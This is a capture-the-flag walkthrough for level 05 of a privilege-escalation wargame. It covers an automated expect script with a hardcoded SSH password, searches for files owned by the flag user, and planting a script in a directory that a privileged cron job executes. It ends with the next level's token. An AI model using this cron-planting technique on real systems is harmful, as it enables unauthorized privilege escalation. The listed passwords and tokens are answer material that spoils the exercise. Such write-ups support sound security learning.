# Level 05
- In the shell of your choice run twice if needed the script attached or follow the steps bellow using your VM IP address to get the flag, also root privileges and some dependencies may be needed to install before
	```sh
	$ chmod u+x script.sh
	$ ./script.sh
	$ cat script.sh
	#!/usr/bin/expect -f
	set ip 192.168.1.103
	spawn ssh -o "StrictHostKeyChecking no" level05@$ip -p 4242 "find / -user 'flag05' -print 2>/dev/null -exec cat \{\} \\\; | head -7 ; find / -name level05 -print 2>/dev/null -exec cat \{\} \\\; | head -2 ; mkdir -p /tmp/level05 ; cd /tmp/level05 ; chmod 777 . ; echo 'getflag > /tmp/level05/flag' > /opt/openarenaserver/level05.sh ; sleep 125 ; cat /tmp/level05/flag"
	expect "sword:"
	send "ne2searoevaevoem4ov4ar8ap\r"
	interact
	```
- Find any files whoes owner is user "flag05"
	```sh
	$ find / -user "flag05" -print 2>/dev/null
	```
- View the content of this found file
	```sh
	$ cat /usr/sbin/openarenaserver
	```
- Find any files whoes name is "level05"
	```sh
	$ find / -name level05 -print 2>/dev/null
	```
- View the content of this found file
	```sh
	$ cat /var/mail/level05
	```
- Make a directory in `/tmp` location and set `777` access to it
	```sh
	$ mkdir -p /tmp/level05
	$ chmod 777 /tmp/level05
	```
- Create a script in `/opt/openarenaserver` location with `getflag` processing and wait for a few minutes
	```sh
	$ echo "getflag > /tmp/level05/flag" > /opt/openarenaserver/level05.sh
	```
- View the content of the newely created `flag` file in the `/tmp/level05` directory
	```sh
	$ cat /tmp/level05/flag
	```
- With the token provided `viuaaale9huek52boumoomioc` switch to the next user level
	```sh
	$ su level06
	Password: viuaaale9huek52boumoomioc
	```
